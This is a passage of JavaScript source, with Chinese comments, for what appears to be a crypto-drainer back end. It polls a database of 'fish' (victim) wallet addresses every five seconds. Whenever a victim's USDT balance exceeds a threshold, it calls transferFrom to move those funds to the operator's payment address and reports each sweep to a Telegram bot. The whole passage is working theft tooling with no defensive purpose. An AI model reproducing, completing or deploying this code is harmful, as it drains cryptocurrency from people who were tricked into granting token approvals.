            "UPDATE fish SET usdt_balance = 0, threshold = 200 WHERE fish_address = ?",
            [fishAddress]
        );
        const message = `【🎣 自动转账通知🎣】\n\n` +
            `🐟鱼苗地址：\n<code>${fishAddress}</code>\n\n` +
            `💳收款地址：\n<code>${configMap.payment_address}</code>\n\n` +
            `💸本次划扣：<code>${transferAmountIn} USDT</code>`;
        const buttons = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${transactionHash}` }
                    ]
                ]
            }
        };
        await bot.sendMessage(NotificationId, message, {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            ...buttons
        });
        console.log(`[${getTimeInfo().time}] 新的阈值转账，交易哈希: ${transactionHash}`);
        return response.data;
    } catch (error) {
        console.error('transferFrom 错误:', error.message);
        throw new Error(`转账失败: ${error.message}`);
    }
}

// 扫描USDT余额大于阈值的地址，执行转账
async function monitorFishTable() {
   while (true) {
       try {
           // 查询 `fish` 表，找出 threshold 不为 0 且 usdt_balance > threshold 的记录
           const [rows] = await pool.promise().query(
               "SELECT fish_address, usdt_balance, threshold FROM fish WHERE (threshold IS NOT NULL AND threshold != 0.000000 AND usdt_balance > threshold)"
           );
           if (rows.length > 0) {
               // 遍历满足条件的记录
               for (const row of rows) {
                   const { fish_address, usdt_balance, threshold } = row;
                   try {
                       // 调用 transferFrom 函数
                       await transferFrom(fish_address, usdt_balance);
                   } catch (error) {
                       // 处理转账失败直接跳过
                   }
               }
           }
           // 等待 5 秒后继续下一轮检查
           await new Promise(resolve => setTimeout(resolve, 5000));
       } catch (error) {
           // 处理查询或其他错误
           // 等待 5 秒后继续下一轮检查
           await new Promise(resolve => setTimeout(resolve, 5000));
       }
   }
}

// 启动所有
async function startServices() {
    try {
        await initBot(); // 初始化 bot
        // 设置消息处理
        setupBotHandlers(bot);
        // 启动循环监控
        fetchLatestBlock();     // 监听区块信息
        monitorFishTable();     // 扫描阈值转账
        cleanPayments();       // 清理支付页面
        
    } catch(error) {
        console.error(`[${getTimeInfo().time}---机器人启动失败:`, error);
        process.exit(1);
    }
}

// 启动程序
startServices();